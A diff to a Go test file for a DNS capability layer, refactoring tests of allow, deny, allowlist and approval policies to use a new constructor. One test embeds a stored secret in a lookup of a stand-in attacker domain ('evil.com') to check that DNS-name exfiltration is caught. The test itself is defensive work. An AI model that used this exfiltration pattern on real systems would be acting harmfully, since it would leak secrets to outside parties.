@@ -18,10 +18,11 @@ import (
 func TestLookup_EgressBlocksSecretInName(t *testing.T) {
 	store := secret.NewStore()
 	store.Set("tok", []byte("supersecretvalue1234"))
-	n := &netcap.Net{
-		Guard:   &gateway.Guard{Policy: allowResolve(capability.Wildcard)},
-		Scanner: secret.NewScanner(store),
-	}
+	n := netcap.New(
+		&gateway.Guard{Policy: allowResolve(capability.Wildcard)}, netcap.WithScanner(
+
+			secret.NewScanner(store)))
+
 	if _, err := n.Lookup(context.Background(), "supersecretvalue1234.evil.com", "A"); !errors.Is(err, secret.ErrLeaked) {
 		t.Fatalf("err = %v, want ErrLeaked (secret in the DNS query name)", err)
 	}
@@ -34,7 +35,7 @@ func allowResolve(hostGlob string) capability.Policy {
 }
 
 func TestResolve_Allow_ReturnsAddrs(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: allowResolve(capability.Wildcard)}}
+	n := netcap.New(&gateway.Guard{Policy: allowResolve(capability.Wildcard)})
 	addrs, err := n.Resolve(context.Background(), "localhost")
 	if err != nil {
 		t.Fatalf("resolve: %v", err)
@@ -48,7 +49,7 @@ func TestResolve_Allow_ReturnsAddrs(t *testing.T) {
 // localhost resolves to 127.0.0.1 and ::1, so the split is observable without a
 // network. An unsupported type is a clear error.
 func TestLookup_RecordType(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: allowResolve(capability.Wildcard)}}
+	n := netcap.New(&gateway.Guard{Policy: allowResolve(capability.Wildcard)})
 	isV4 := func(s string) bool { ip := net.ParseIP(s); return ip != nil && ip.To4() != nil }
 
 	a, err := n.Lookup(context.Background(), "localhost", "A")
@@ -82,14 +83,14 @@ func TestLookup_RecordType(t *testing.T) {
 }
 
 func TestResolve_Deny(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: capability.Policy{}}} // deny-by-default
+	n := netcap.New(&gateway.Guard{Policy: capability.Policy{}}) // deny-by-default
 	if _, err := n.Resolve(context.Background(), "localhost"); !errors.Is(err, gateway.ErrDenied) {
 		t.Fatalf("err = %v, want ErrDenied", err)
 	}
 }
 
 func TestResolve_HostAllowlist_DeniesOtherHost(t *testing.T) {
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: allowResolve("*.example.com")}}
+	n := netcap.New(&gateway.Guard{Policy: allowResolve("*.example.com")})
 	if _, err := n.Resolve(context.Background(), "localhost"); !errors.Is(err, gateway.ErrDenied) {
 		t.Fatalf("resolve of non-allowlisted host: err = %v, want ErrDenied", err)
 	}
@@ -99,7 +100,7 @@ func TestResolve_Ask_DenyBlocks(t *testing.T) {
 	policy := capability.Policy{Rules: []capability.Rule{
 		{Family: "dns", TargetGlob: capability.Wildcard, Writes: capability.MatchRead, Effect: capability.Ask, Epoch: capability.Permanent},
 	}}
-	n := &netcap.Net{Guard: &gateway.Guard{Policy: policy, Approvals: askEngine(false), TTL: time.Second}}
+	n := netcap.New(&gateway.Guard{Policy: policy, Approvals: askEngine(false), TTL: time.Second})
 	if _, err := n.Resolve(context.Background(), "localhost"); !errors.Is(err, gateway.ErrDenied) {
 		t.Fatalf("err = %v, want ErrDenied", err)
 	}
